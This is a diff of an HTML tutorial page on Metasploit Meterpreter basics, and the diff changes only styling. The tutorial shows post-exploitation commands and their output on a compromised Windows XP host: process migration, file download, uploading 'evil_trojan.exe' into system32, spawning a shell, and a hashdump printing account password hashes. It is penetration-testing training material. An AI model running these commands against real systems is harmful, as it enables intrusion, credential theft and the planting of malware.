@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>Metasploit Meterpreter Basics</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Metasploit
 Meterpreter Basics</h1>
@@ -23,7 +23,7 @@ menu.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; help<br><br>Core Commands<br>=============<br><br>    Command       Description<br>    -------       -----------<br>    ?             Help menu<br>    background    Backgrounds the current session<br>    channel       Displays information about active channels<br>...snip...</pre>
+<pre id="code"><u>meterpreter</u> &gt; help<br><br>Core Commands<br>=============<br><br>    Command       Description<br>    -------       -----------<br>    ?             Help menu<br>    background    Backgrounds the current session<br>    channel       Displays information about active channels<br>...snip...</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">background</b><span
  style="color: rgb(0, 0, 0);">The 'background' command will send the
@@ -32,14 +32,14 @@ Meterpreter session to the background and return you to the msf prompt.
 To get back to your Meterpreter session, just interact with it again.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; background<br>msf exploit(ms08_067_netapi) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; background<br>msf exploit(ms08_067_netapi) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">ps</b><span style="color: rgb(0, 0, 0);">
 The 'ps' command displays a list of running processes on the target.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; ps<br><br>Process list<br>============<br><br>    PID   Name                  Path<br>    ---   ----                  ----<br>    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe<br>    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe<br>    288   snmp.exe              C:\WINDOWS\System32\snmp.exe<br>...snip...</pre>
+<pre id="code"><u>meterpreter</u> &gt; ps<br><br>Process list<br>============<br><br>    PID   Name                  Path<br>    ---   ----                  ----<br>    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe<br>    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe<br>    288   snmp.exe              C:\WINDOWS\System32\snmp.exe<br>...snip...</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">migrate</b><span
  style="color: rgb(0, 0, 0);">
@@ -47,14 +47,14 @@ Using the 'migrate' command, you can migrate to another process on the
 victim.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; migrate 1792<br>[*] Migrating to 1792...<br>[*] Migration completed successfully.<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; migrate 1792<br>[*] Migrating to 1792...<br>[*] Migration completed successfully.<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">ls</b><span style="color: rgb(0, 0, 0);">
 As in Linux, the 'ls' command will list the files in the current remote
 directory.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; ls<br><br>Listing: C:\Documents and Settings\victim<br>=========================================<br><br>Mode              Size     Type  Last modified                   Name<br>----              ----     ----  -------------                   ----<br>40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .<br>40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..<br>100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel<br>40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data<br>...snip...</pre>
+<pre id="code"><u>meterpreter</u> &gt; ls<br><br>Listing: C:\Documents and Settings\victim<br>=========================================<br><br>Mode              Size     Type  Last modified                   Name<br>----              ----     ----  -------------                   ----<br>40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .<br>40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..<br>100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel<br>40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data<br>...snip...</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">download</b><span
  style="color: rgb(0, 0, 0);">The 'download' command downloads a file
@@ -63,7 +63,7 @@ machine. Note the use of the double-slashes when giving the Windows
 path.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; download c:\\boot.ini<br>[*] downloading: c:\boot.ini -&gt; c:\boot.ini<br>[*] downloaded : c:\boot.ini -&gt; c:\boot.ini/boot.ini<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; download c:\\boot.ini<br>[*] downloading: c:\boot.ini -&gt; c:\boot.ini<br>[*] downloaded : c:\boot.ini -&gt; c:\boot.ini/boot.ini<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">'</span><b
  style="color: rgb(0, 0, 0);">upload</b><span
@@ -72,7 +72,7 @@ As with the 'download' command, you need to use double-slashes with the
 'upload' command.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; upload evil_trojan.exe c:\\windows\\system32<br>[*] uploading  : evil_trojan.exe -&gt; c:\windows\system32<br>[*] uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; upload evil_trojan.exe c:\\windows\\system32<br>[*] uploading  : evil_trojan.exe -&gt; c:\windows\system32<br>[*] uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">ipconfig</b><span
  style="color: rgb(0, 0, 0);">
@@ -80,7 +80,7 @@ The 'ipconfig' command displays the network interfaces and addresses on
 the remote machine.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; ipconfig<br><br>MS TCP Loopback interface<br>Hardware MAC: 00:00:00:00:00:00<br>IP Address  : 127.0.0.1<br>Netmask     : 255.0.0.0<br><br>AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport<br>Hardware MAC: 00:0c:29:10:f5:15<br>IP Address  : 192.168.1.104<br>Netmask     : 255.255.0.0<br><br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; ipconfig<br><br>MS TCP Loopback interface<br>Hardware MAC: 00:00:00:00:00:00<br>IP Address  : 127.0.0.1<br>Netmask     : 255.0.0.0<br><br>AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport<br>Hardware MAC: 00:0c:29:10:f5:15<br>IP Address  : 192.168.1.104<br>Netmask     : 255.255.0.0<br><br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">getuid</b><span
  style="color: rgb(0, 0, 0);">
@@ -88,14 +88,14 @@ Running 'getuid' will display the user that the Meterpreter server is
 running as on the host.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">execute</b><span
  style="color: rgb(0, 0, 0);">
 The 'execute' command runs a command on the target.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; execute -f cmd.exe -i -H<br>Process 38320 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; execute -f cmd.exe -i -H<br>Process 38320 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
 <span style="color: rgb(0, 0, 0);">'
 </span><br style="color: rgb(0, 0, 0);">
 <i style="color: rgb(0, 0, 0);">shell'</i><span
@@ -104,7 +104,7 @@ The 'shell' command will present you with a standard shell on the
 target system.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; shell<br>Process 39640 created.<br>Channel 2 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; shell<br>Process 39640 created.<br>Channel 2 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">idletime</b><span
  style="color: rgb(0, 0, 0);">
@@ -112,14 +112,14 @@ Running 'idletime' will display the number of seconds that the user at
 the remote machine has been idle.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; idletime<br>User has been idle for: 5 hours 26 mins 35 secs<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; idletime<br>User has been idle for: 5 hours 26 mins 35 secs<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <b style="color: rgb(0, 0, 0);">hashdump</b><span
  style="color: rgb(0, 0, 0);">
 The 'hashdump' command will dump the contents of the SAM database.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; hashdump<br>Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::<br>dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::<br>SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::<br>victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; hashdump<br>Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::<br>dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::<br>SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::<br>victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
 <div style="text-align: center; color: rgb(0, 0, 0);"><a
